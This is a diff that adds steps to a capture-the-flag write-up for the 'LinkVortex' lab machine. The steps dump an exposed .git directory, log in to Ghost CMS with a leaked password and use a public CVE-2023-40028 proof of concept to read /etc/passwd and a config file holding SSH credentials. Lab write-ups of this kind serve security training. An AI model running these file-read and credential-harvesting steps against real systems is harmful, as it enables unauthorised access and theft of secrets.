@@ -71,6 +71,8 @@ Find `dev` subdomain, so add to `/etc/hosts` and open!
 
 ![image](https://github.com/user-attachments/assets/14c6ca4d-0ac6-4bcd-8a89-efe73e401c4b)
 
+### Directory enumeration
+
 Enumerate the directories for dev.linkvortex.htb
 
 `python3 dirsearch.py -u http://dev.linkvortex.htb`
@@ -99,9 +101,76 @@ Enumerate the directories for dev.linkvortex.htb
         403 -   199B - /server-status                                    
         403 -   199B - /server-status/
 
-                                            
+We can find `/.git/` let's use GitHack
+
+### GitHack
+
+    python3 GitHack.py -u "http://dev.linkvortex.htb/.git/"
+
+![image](https://github.com/user-attachments/assets/8ef7be29-cc87-4f12-be1e-812197554f84)
+
+    cat dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js
+
+![image](https://github.com/user-attachments/assets/392bec70-cd33-491b-84e9-3c28fc588b03)
+
+Password:
+
+    OctopiFociPilfer45
+
+Open page linkvortex.htb/ghost/#/signin and try to login like `admin`
+
+`admin@linkvortex.htb`:`OctopiFociPilfer45`
+
+![image](https://github.com/user-attachments/assets/cf968a12-5b5e-4aff-8c24-20bc9a718fff)
+
+![image](https://github.com/user-attachments/assets/12f1bff5-e807-4c1c-a129-d82507bf27bb)
+
+We now know the version of the CMS `GHost`. 
+
+It is `v5.58.0`, we can find this out using `Wappalyzer` or by reading `/.git/config`. 
+
+![image](https://github.com/user-attachments/assets/11fc0e3c-fb2c-4e29-94f5-b45096abe554)
+
 ## Exploitation 
 
 ### CVE-2023-40028
 
 CVE-2023-40028 is a vulnerability in Ghost CMS that allows arbitrary file reads through improper file handling. 
+
+Find and clone the open POC for CVE-2023-40028.
+
+    git clone https://github.com/0xyassine/CVE-2023-40028
+
+Change `GHOST_URL` IP to our host!
+
+    GHOST_URL='http://linkvortex.htb'
+
+![image](https://github.com/user-attachments/assets/d37ecaa3-f736-437f-8b35-af95ec74a57d)
+
+Run script
+
+    ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
+
+And enter file name || path.
+
+file> `/etc/passwd`
+
+![image](https://github.com/user-attachments/assets/5439acf3-9f21-403f-8999-ce44c2a815dc)
+
+If you remember we have a Dockerfile from GitHack, let's go through it.
+
+![image](https://github.com/user-attachments/assets/7b18733b-1a23-4a25-a5c1-b8231b7f7545)
+
+    var/lib/ghost/config.production.json
+
+![image](https://github.com/user-attachments/assets/4cfac89a-a9ff-4194-b6ef-b53a0a2d5f6d)
+
+Credentials `bob@linkvortex.htb`:`fibber-talented-worth`
+
+    ssh bob@linkvortex.htb
+
+![image](https://github.com/user-attachments/assets/b6e4fd1a-a7a8-4d10-896a-a246d6186afc)
+
+### Get the user flag!
+
+![image](https://github.com/user-attachments/assets/830f92a3-f1b1-4840-9368-8a7f568046df)
